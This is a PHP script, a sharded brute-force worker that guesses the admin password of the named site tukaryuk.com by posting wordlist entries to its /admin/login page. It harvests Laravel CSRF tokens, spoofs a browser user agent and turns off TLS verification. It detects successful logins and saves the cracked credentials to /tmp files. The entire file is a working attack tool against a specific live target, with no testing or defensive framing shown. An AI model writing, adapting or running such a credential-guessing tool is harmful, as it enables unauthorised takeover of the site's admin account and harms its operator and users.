<?php
/* brute.php — tukaryuk.com admin login worker (shard-aware)
 * usage: php brute.php <shard> <nshards> <wordlist> <outfile> [base_url]
 * Laravel CSRF token is session-wide and reusable -> 1 GET per session.
 */
$shard = (int)($argv[1] ?? 0);
$nsh   = max(1, (int)($argv[2] ?? 1));
$wl    = $argv[3] ?? '/tmp/wl.txt';
$out   = $argv[4] ?? '/tmp/brute.out';
$base  = $argv[5] ?? 'https://tukaryuk.com';
$email = 'admin@tukaryuk.com';
$UA    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

$words = @file($wl, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (!$words) { file_put_contents($out, "NO WORDLIST $wl\n", FILE_APPEND); exit(1); }
$total = count($words);
file_put_contents($out, "START shard=$shard/$nsh words=$total host=" . gethostname() . "\n", FILE_APPEND);

$jar = tempnam(sys_get_temp_dir(), 'ck');
$tok = null;
$i = 0;
$t0 = time();

for ($idx = 0; $idx < $total; $idx++) {
    if ($idx % $nsh !== $shard) continue;
    $pw = $words[$idx];

    if ($tok === null || $i % 40 === 0) {
        @unlink($jar);
        $ch = curl_init($base . '/admin/login');
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => 1, CURLOPT_COOKIEJAR => $jar, CURLOPT_COOKIEFILE => $jar,
            CURLOPT_USERAGENT => $UA, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_TIMEOUT => 30, CURLOPT_CONNECTTIMEOUT => 20,
        ]);
        $html = curl_exec($ch);
        curl_close($ch);
        if ($html && preg_match('/name="_token" value="([^"]+)"/', $html, $m)) {
            $tok = $m[1];
        } else {
            $tok = null;
            file_put_contents($out, "tokfail idx=$idx\n", FILE_APPEND);
            continue;
        }
    }

    $ch = curl_init($base . '/admin/login');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => 1, CURLOPT_POST => 1,
        CURLOPT_COOKIEJAR => $jar, CURLOPT_COOKIEFILE => $jar,
        CURLOPT_POSTFIELDS => http_build_query([
            '_token' => $tok, 'email' => $email, 'password' => $pw, 'remember' => '1',
        ]),
        CURLOPT_USERAGENT => $UA, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_TIMEOUT => 30, CURLOPT_CONNECTTIMEOUT => 20, CURLOPT_FOLLOWLOCATION => 0,
        CURLOPT_HEADER => 1,
        CURLOPT_HTTPHEADER => ['Referer: ' . $base . '/admin/login', 'Origin: ' . $base],
    ]);
    $resp = curl_exec($ch);
    $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $i++;

    $body = '';
    if ($resp !== false) {
        $p = strpos($resp, "\r\n\r\n");
        $body = ($p !== false) ? substr($resp, $p + 4) : $resp;
    }
    $wrong = (stripos($body, 'salah') !== false) || (stripos($body, 'kedaluwarsa') !== false);
    if ($code == 302 || ($code == 200 && !$wrong && strlen($body) > 1000)) {
        file_put_contents($out, "*** HIT *** password=$pw code=$code\n", FILE_APPEND);
        file_put_contents('/tmp/HIT_' . $shard . '.txt', "$email:$pw\n");
    }
    if ($i % 100 === 0) {
        $el = max(1, time() - $t0);
        file_put_contents($out, sprintf("progress i=%d rate=%.2f/s last=%s\n", $i, $i / $el, $pw), FILE_APPEND);
    }
}
$el = max(1, time() - $t0);
file_put_contents($out, sprintf("DONE shard=%d i=%d elapsed=%ds rate=%.2f/s\n", $shard, $i, $el, $i / $el), FILE_APPEND);